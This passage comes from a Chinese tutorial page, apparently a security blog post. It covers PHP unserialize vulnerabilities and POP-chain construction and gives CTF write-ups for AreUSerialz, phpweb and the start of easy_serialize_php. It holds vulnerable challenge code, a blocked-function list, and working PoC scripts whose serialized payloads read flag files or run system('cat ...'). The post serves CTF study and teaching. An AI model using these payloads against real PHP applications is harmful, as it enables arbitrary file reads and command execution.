+<p><strong>反序列化</strong>：把字节序列恢复为对象的过程。</p>
+</blockquote>
+<h3 id=漏洞可能出现的位置>漏洞可能出现的位置<a hidden class=anchor aria-hidden=true href=#漏洞可能出现的位置>#</a></h3>
+<p>1.解析认证token、session的位置</p>
+<p>2.将序列化的对象存储到磁盘文件或存入数据库后反序列化时的位置，如读取json文件，xml文件等</p>
+<p>3.将对象序列化后在网络中传输，如传输json数据，xml数据等</p>
+<p>4.参数传递给程序</p>
+<p>5.使用RMI协议，被广泛使用的RMI协议完全基于序列化</p>
+<p>6.使用了不安全的框架或基础类库，如JMX 、Fastjson和Jackson等</p>
+<p>7.定义协议用来接收与发送原始的java对象</p>
+<h3 id=原理>原理<a hidden class=anchor aria-hidden=true href=#原理>#</a></h3>
+<p>在程序将字节序列恢复为对象的过程中，信任了可能被第三方篡改过的字节序列（内容可控），在将其反序列化的过程中，通过触发魔术方法（Python、PHP）或反射机制（JAVA），实现传入任意参数调用方法（POP链利用）。</p>
+<h3 id=序列化后的对象字符串>序列化后的对象字符串<a hidden class=anchor aria-hidden=true href=#序列化后的对象字符串>#</a></h3>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#a6e22e>O</span><span style=color:#f92672>:</span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;A&#34;</span><span style=color:#f92672>:</span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span>{<span style=color:#a6e22e>s</span><span style=color:#f92672>:</span><span style=color:#ae81ff>7</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;%00A%00name&#34;</span>;<span style=color:#a6e22e>s</span><span style=color:#f92672>:</span><span style=color:#ae81ff>6</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;As1def&#34;</span>;}
+
+<span style=color:#75715e>// O代表这是一个对象，第一个1代表对象名称的长度，第二个1代表成员个数。
+</span><span style=color:#75715e>// 大括号中分别是：属性名类型、长度、名称;值类型、长度、值。
+</span><span style=color:#75715e>// s代表string类型
+</span><span style=color:#75715e>// 另外还有b=&gt;bool  i=&gt;int  d=&gt;double  a=&gt;array r=&gt;对象引用 R=&gt; 指针引用 N=&gt;NULL;
+</span><span style=color:#75715e></span>
+<span style=color:#75715e>// 有%00是加上protected或private关键字限定的类变量，这种类变量在进行反序列化操作时需要对其进行URL编码，否则存在%0A错误解析成截断的可能性。
+</span></code></pre></div><h2 id=pop链构造>POP链构造<a hidden class=anchor aria-hidden=true href=#pop链构造>#</a></h2>
+<blockquote>
+<p>POP（Property-Oriented Programing）面向属性编程，用于上层语言构造特定调用链的方法，从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构造一组连续的调用链，达到攻击者恶意利用的目的。</p>
+</blockquote>
+<p>即构造一条完整的调用链，通过控制对象的属性实现控制程序的执行流程，达到利用无害代码实现有害操作的目的。</p>
+<h3 id=实例>实例<a hidden class=anchor aria-hidden=true href=#实例>#</a></h3>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+<span style=color:#75715e>//flag is in flag.php
+</span><span style=color:#75715e></span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>1</span>);
+<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Read</span> {
+    <span style=color:#66d9ef>public</span> $var;
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>file_get</span>($value)
+    {
+        $text <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_encode</span>(<span style=color:#a6e22e>file_get_contents</span>($value));
+        <span style=color:#66d9ef>return</span> $text;
+    }
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __invoke(){
+        $content <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file_get</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>var</span>);
+        <span style=color:#66d9ef>echo</span> $content;
+    }
+}
+
+<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Show</span>
+{
+    <span style=color:#66d9ef>public</span> $source;
+    <span style=color:#66d9ef>public</span> $str;
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct($file<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;index.php&#39;</span>)
+    {
+        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span> <span style=color:#f92672>=</span> $file;
+        <span style=color:#66d9ef>echo</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;Welcome&#39;</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;br&gt;&#34;</span>;
+    }
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __toString()
+    {
+        <span style=color:#66d9ef>return</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span>[<span style=color:#e6db74>&#39;str&#39;</span>]<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span>;
+    }
+
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>_show</span>()
+    {
+        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#39;</span>,$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span>)) {
+            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;hacker&#39;</span>);
+        } <span style=color:#66d9ef>else</span> {
+            <span style=color:#a6e22e>highlight_file</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span>); 
+        }
+
+    }
+
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __wakeup()
+    {
+        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span>)) {
+            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;hacker&#34;</span>;
+            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;index.php&#34;</span>;
+        }
+    }
+}
+
+<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Test</span>
+{
+    <span style=color:#66d9ef>public</span> $p;
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct()
+    {
+        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>();
+    }
+
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __get($key)
+    {
+        $function <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span>;
+        <span style=color:#66d9ef>return</span> $function();
+    }
+}
+
+<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;hello&#39;</span>]))
+{
+    <span style=color:#a6e22e>unserialize</span>($_GET[<span style=color:#e6db74>&#39;hello&#39;</span>]);
+}
+<span style=color:#66d9ef>else</span>
+{
+    $show <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Show</span>(<span style=color:#e6db74>&#39;pop3.php&#39;</span>);
+    $show<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>_show</span>();
+}
+</code></pre></div><h4 id=分析思路>分析思路<a hidden class=anchor aria-hidden=true href=#分析思路>#</a></h4>
+<ul>
+<li>先找到能利用的点：Read.file_get里的file_get_contents可以获取文件，在作为对象函数执行（<code>__invoke</code>）时可读取文件。</li>
+<li>可控的是<code>get</code>传入的hello参数，将hello值反序列化，此时会调用<code>__wakeup</code>方法，只有Show类中存在该方法。<code>\_\_wakeup</code>方法中会对<code>$this->source</code>进行正则匹配，此时会将<code>source</code>的内容当作字符串处理，即调用<code>__toString()</code>方法。</li>
+<li><code>__toString</code>方法中读取了<code>$this->str['str']->source</code>，如果<code>str['str']</code>对象中没有<code>source</code>这个变量呢？此时就会调用<code>__get</code>魔术方法（如果该对象存在这个方法的话）。</li>
+<li>观察程序，发现只有Test类有<code>__get</code>方法，用Test类继续构造POP链，会调用<code>$this->p</code>变量，并将<code>$this->p</code>作为函数执行，此时就来到了我们找到的利用点——Read类中的<code>__invoke</code>魔术方法！</li>
+</ul>
+<p>如此，我们构造好了一条POP链：</p>
+<p><code>$_GET['hello']->Show.__wakeup->Show.__toString->Test.__get->Read.__invoke->Read.file_get->读取任意文件</code></p>
+<p>得到POC</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Read</span>{
+        <span style=color:#66d9ef>public</span> $var <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;flag.php&#34;</span>;
+    }
+    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Show</span>{
+        <span style=color:#66d9ef>public</span> $source;
+        <span style=color:#66d9ef>public</span> $str;
+    }
+
+    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Test</span>{
+        <span style=color:#66d9ef>public</span> $p;
+    }
+
+    $read <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Read</span>();
+    $show <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Show</span>();
+    $test <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Test</span>();
+
+    $show<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span>[<span style=color:#e6db74>&#39;str&#39;</span>]<span style=color:#f92672>=</span>$test; 
+    $test<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span><span style=color:#f92672>=</span>$read;
+    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>serialize</span>($show);
+    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;
+</span><span style=color:#e6db74>    &#39;</span>;
+    $show<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span><span style=color:#f92672>=</span>$show; <span style=color:#75715e>//这个地方是为了触发Show类中的__toString方法，因为正则判断是对source进行字符串化
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>serialize</span>($show);
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><h4 id=总结>总结<a hidden class=anchor aria-hidden=true href=#总结>#</a></h4>
+<ol>
+<li>先观察是否存在利用点
+<ol>
+<li>可执行命令、文件包含的敏感函数</li>
+<li>参数可控的变量、入口</li>
+</ol>
+</li>
+<li>注意所有魔术方法</li>
+<li>将魔术方法执行顺序连成一条链</li>
+<li>确定对象调用顺序，填入对象变量参数，构造POP链</li>
+</ol>
+<h2 id=题目>题目<a hidden class=anchor aria-hidden=true href=#题目>#</a></h2>
+<h3 id=网鼎杯-2020-青龙组areuserialzhttpsbuuojcnchallenges网鼎杯-2020-青龙组areuserialz>[[网鼎杯 2020 青龙组]AreUSerialz](https://buuoj.cn/challenges#[网鼎杯 2020 青龙组]AreUSerialz)<a hidden class=anchor aria-hidden=true href=#网鼎杯-2020-青龙组areuserialzhttpsbuuojcnchallenges网鼎杯-2020-青龙组areuserialz>#</a></h3>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+
+<span style=color:#66d9ef>include</span>(<span style=color:#e6db74>&#34;flag.php&#34;</span>);
+
+<span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
+
+<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>FileHandler</span> {
+
+    <span style=color:#66d9ef>protected</span> $op;
+    <span style=color:#66d9ef>protected</span> $filename;
+    <span style=color:#66d9ef>protected</span> $content;
+
+    <span style=color:#66d9ef>function</span> __construct() {
+        $op <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;1&#34;</span>;
+        $filename <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/tmp/tmpfile&#34;</span>;
+        $content <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Hello World!&#34;</span>;
+        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>process</span>();
+    }
+
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>process</span>() {
+        <span style=color:#66d9ef>if</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>op</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;1&#34;</span>) {
+            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>write</span>();
+        } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>op</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;2&#34;</span>) {
+            $res <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>read</span>();
+            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>output</span>($res);
+        } <span style=color:#66d9ef>else</span> {
+            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>output</span>(<span style=color:#e6db74>&#34;Bad Hacker!&#34;</span>);
+        }
+    }
+
+    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>write</span>() {
+        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>filename</span>) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>isset</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>content</span>)) {
+            <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>strlen</span>((<span style=color:#a6e22e>string</span>)$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>content</span>) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>100</span>) {
+                $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>output</span>(<span style=color:#e6db74>&#34;Too long!&#34;</span>);
+                <span style=color:#66d9ef>die</span>();
+            }
+            $res <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_put_contents</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>filename</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>content</span>);
+            <span style=color:#66d9ef>if</span>($res) $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>output</span>(<span style=color:#e6db74>&#34;Successful!&#34;</span>);
+            <span style=color:#66d9ef>else</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>output</span>(<span style=color:#e6db74>&#34;Failed!&#34;</span>);
+        } <span style=color:#66d9ef>else</span> {
+            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>output</span>(<span style=color:#e6db74>&#34;Failed!&#34;</span>);
+        }
+    }
+
+    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>read</span>() {
+        $res <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
+        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>filename</span>)) {
+            $res <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>filename</span>);
+        }
+        <span style=color:#66d9ef>return</span> $res;
+    }
+
+    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>output</span>($s) {
+        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;[Result]: &lt;br&gt;&#34;</span>;
+        <span style=color:#66d9ef>echo</span> $s;
+    }
+
+    <span style=color:#66d9ef>function</span> __destruct() {
+        <span style=color:#66d9ef>if</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>op</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;2&#34;</span>)
+            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>op</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;1&#34;</span>;
+        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>content</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
+        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>process</span>();
+    }
+
+}
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>is_valid</span>($s) {
+    <span style=color:#66d9ef>for</span>($i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>strlen</span>($s); $i<span style=color:#f92672>++</span>)
+        <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>(<span style=color:#a6e22e>ord</span>($s[$i]) <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>32</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>ord</span>($s[$i]) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>125</span>))
+            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+}
+
+<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET{<span style=color:#e6db74>&#39;str&#39;</span>})) {
+
+    $str <span style=color:#f92672>=</span> (<span style=color:#a6e22e>string</span>)$_GET[<span style=color:#e6db74>&#39;str&#39;</span>];
+    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>is_valid</span>($str)) {
+        $obj <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($str);
+    }
+
+}
+</code></pre></div><p>观察发现，有反序列化入口，为传入的get参数$str</p>
+<p>会先检查ASCII码是否符合条件，而类FileHandler中的三个变量均为Protected类型，序列化后会有<code>\x00*\x00</code>标识，而<code>\x00</code>的ASCII码值为0，不符合条件。</p>
+<h4 id=利用php特性绕过反序列化限制><strong>利用PHP特性绕过反序列化限制</strong><a hidden class=anchor aria-hidden=true href=#利用php特性绕过反序列化限制>#</a></h4>
+<ol>
+<li>PHP 7.1+版本对属性类型不敏感，可将Protected直接换成Public也可反序列化。</li>
+<li>可用S代替s，如此可支持解析16进制文本，即将非ASCII文本变成16进制文本</li>
+</ol>
+<h4 id=php-弱类型绕过>PHP 弱类型绕过<a hidden class=anchor aria-hidden=true href=#php-弱类型绕过>#</a></h4>
+<p>类中有一个析构函数<code>__destruct</code>，在对象销毁后，会执行一次写文件覆盖操作，需要绕过。</p>
+<p>注意到析构函数中判断使用的是强类型相等<code>===</code>，而<code>process</code>类中的判断时弱类型相等<code>==</code>，可以利用PHP语言特性绕过：<code>"2"==2,2!==="2"</code></p>
+<p>令<code>$op=2</code>而不是<code>"2"</code>即可</p>
+<h4 id=构造poc>构造POC<a hidden class=anchor aria-hidden=true href=#构造poc>#</a></h4>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+
+<span style=color:#66d9ef>use</span> <span style=color:#a6e22e>FileHandler</span> <span style=color:#66d9ef>as</span> <span style=color:#a6e22e>GlobalFileHandler</span>;
+
+    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>FileHandler</span>{
+        <span style=color:#66d9ef>public</span> $op<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>;
+        <span style=color:#66d9ef>public</span> $filename<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;flag.php&#34;</span>;
+        <span style=color:#66d9ef>public</span> $content;
+    }
+
+    $fileHandler <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>FileHandler</span>();
+    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>serialize</span>($fileHandler);
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>得到</p>
+<p><code>O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;} </code></p>
+<p>执行查看源代码即得到Flag。</p>
+<h3 id=网鼎杯-2020-朱雀组phpwebhttpsbuuojcnchallenges网鼎杯-2020-朱雀组phpweb>[[网鼎杯 2020 朱雀组]phpweb](https://buuoj.cn/challenges#[网鼎杯 2020 朱雀组]phpweb)<a hidden class=anchor aria-hidden=true href=#网鼎杯-2020-朱雀组phpwebhttpsbuuojcnchallenges网鼎杯-2020-朱雀组phpweb>#</a></h3>
+<p>进入题目环境后查看源代码，有两个隐藏的表单输入框，同时定时每5秒提交表单，抓包并分析报错可知，是<code>call_user_func</code>方法，第一个参数是要调用的函数名，第二个参数是要调用的函数的参数。</p>
+<p>直接<code>highlight_file</code>读取本页面源码，得到：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+<span style=color:#75715e>// phpweb poc
+</span><span style=color:#75715e></span>    $disable_fun <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;exec&#34;</span>,<span style=color:#e6db74>&#34;shell_exec&#34;</span>,<span style=color:#e6db74>&#34;system&#34;</span>,<span style=color:#e6db74>&#34;passthru&#34;</span>,<span style=color:#e6db74>&#34;proc_open&#34;</span>,<span style=color:#e6db74>&#34;show_source&#34;</span>,<span style=color:#e6db74>&#34;phpinfo&#34;</span>,<span style=color:#e6db74>&#34;popen&#34;</span>,<span style=color:#e6db74>&#34;dl&#34;</span>,<span style=color:#e6db74>&#34;eval&#34;</span>,<span style=color:#e6db74>&#34;proc_terminate&#34;</span>,<span style=color:#e6db74>&#34;touch&#34;</span>,<span style=color:#e6db74>&#34;escapeshellcmd&#34;</span>,<span style=color:#e6db74>&#34;escapeshellarg&#34;</span>,<span style=color:#e6db74>&#34;assert&#34;</span>,<span style=color:#e6db74>&#34;substr_replace&#34;</span>,<span style=color:#e6db74>&#34;call_user_func_array&#34;</span>,<span style=color:#e6db74>&#34;call_user_func&#34;</span>,<span style=color:#e6db74>&#34;array_filter&#34;</span>, <span style=color:#e6db74>&#34;array_walk&#34;</span>,  <span style=color:#e6db74>&#34;array_map&#34;</span>,<span style=color:#e6db74>&#34;registregister_shutdown_function&#34;</span>,<span style=color:#e6db74>&#34;register_tick_function&#34;</span>,<span style=color:#e6db74>&#34;filter_var&#34;</span>, <span style=color:#e6db74>&#34;filter_var_array&#34;</span>, <span style=color:#e6db74>&#34;uasort&#34;</span>, <span style=color:#e6db74>&#34;uksort&#34;</span>, <span style=color:#e6db74>&#34;array_reduce&#34;</span>,<span style=color:#e6db74>&#34;array_walk&#34;</span>, <span style=color:#e6db74>&#34;array_walk_recursive&#34;</span>,<span style=color:#e6db74>&#34;pcntl_exec&#34;</span>,<span style=color:#e6db74>&#34;fopen&#34;</span>,<span style=color:#e6db74>&#34;fwrite&#34;</span>,<span style=color:#e6db74>&#34;file_put_contents&#34;</span>);
+    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>gettime</span>($func, $p) {
+        $result <span style=color:#f92672>=</span> <span style=color:#a6e22e>call_user_func</span>($func, $p);
+        $a<span style=color:#f92672>=</span> <span style=color:#a6e22e>gettype</span>($result);
+        <span style=color:#66d9ef>if</span> ($a <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;string&#34;</span>) {
+            <span style=color:#66d9ef>return</span> $result;
+        } <span style=color:#66d9ef>else</span> {<span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>;}
+    }
+    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Test</span> {
+        <span style=color:#66d9ef>var</span> $p <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Y-m-d h:i:s a&#34;</span>;
+        <span style=color:#66d9ef>var</span> $func <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;date&#34;</span>;
+        <span style=color:#66d9ef>function</span> __destruct() {
+            <span style=color:#66d9ef>if</span> ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>func</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span>) {
+                <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>gettime</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>func</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span>);
+            }
+        }
+    }
+    $func <span style=color:#f92672>=</span> $_REQUEST[<span style=color:#e6db74>&#34;func&#34;</span>];
+    $p <span style=color:#f92672>=</span> $_REQUEST[<span style=color:#e6db74>&#34;p&#34;</span>];
+
+    <span style=color:#66d9ef>if</span> ($func <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
+        $func <span style=color:#f92672>=</span> <span style=color:#a6e22e>strtolower</span>($func);
+        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>in_array</span>($func,$disable_fun)) {
+            <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>gettime</span>($func, $p);
+        }<span style=color:#66d9ef>else</span> {
+            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Hacker...&#34;</span>);
+        }
+    }
+    <span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>无过滤，直来直去，直接构造POC</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Test</span>{
+        <span style=color:#75715e>// var $p = &#34;find / -name flag*&#34;; 先查一下服务器中含有flag的文件名，找到位置
+</span><span style=color:#75715e></span>        <span style=color:#66d9ef>var</span> $p <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;cat /tmp/flagoefiu4r93&#34;</span>;
+
+        <span style=color:#66d9ef>var</span> $func <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;system&#34;</span>;
+        
+    }
+    $test <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Test</span> ();
+    
+    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>urlencode</span>(<span style=color:#a6e22e>serialize</span>($test));
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><h3 id=安洵杯-2019-easy_serialize_php>[安洵杯 2019] easy_serialize_php<a hidden class=anchor aria-hidden=true href=#安洵杯-2019-easy_serialize_php>#</a></h3>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+<span style=color:#75715e>// 	d0g3_f1ag.php
+</span><span style=color:#75715e></span>$function <span style=color:#f92672>=</span> <span style=color:#f92672>@</span>$_GET[<span style=color:#e6db74>&#39;f&#39;</span>];
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>filter</span>($img){
+    $filter_arr <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;php&#39;</span>,<span style=color:#e6db74>&#39;flag&#39;</span>,<span style=color:#e6db74>&#39;php5&#39;</span>,<span style=color:#e6db74>&#39;php4&#39;</span>,<span style=color:#e6db74>&#39;fl1g&#39;</span>);
+    $filter <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/&#39;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>implode</span>(<span style=color:#e6db74>&#39;|&#39;</span>,$filter_arr)<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;/i&#39;</span>;
+    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>preg_replace</span>($filter,<span style=color:#e6db74>&#39;&#39;</span>,$img);
+}
+
+
+<span style=color:#66d9ef>if</span>($_SESSION){
+    <span style=color:#a6e22e>unset</span>($_SESSION);
+}
+
+$_SESSION[<span style=color:#e6db74>&#34;user&#34;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;guest&#39;</span>;
+$_SESSION[<span style=color:#e6db74>&#39;function&#39;</span>] <span style=color:#f92672>=</span> $function;
+
+<span style=color:#a6e22e>extract</span>($_POST);
+
+<span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>$function){
+    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;&lt;a href=&#34;index.php?f=highlight_file&#34;&gt;source_code&lt;/a&gt;&#39;</span>;
+}
+
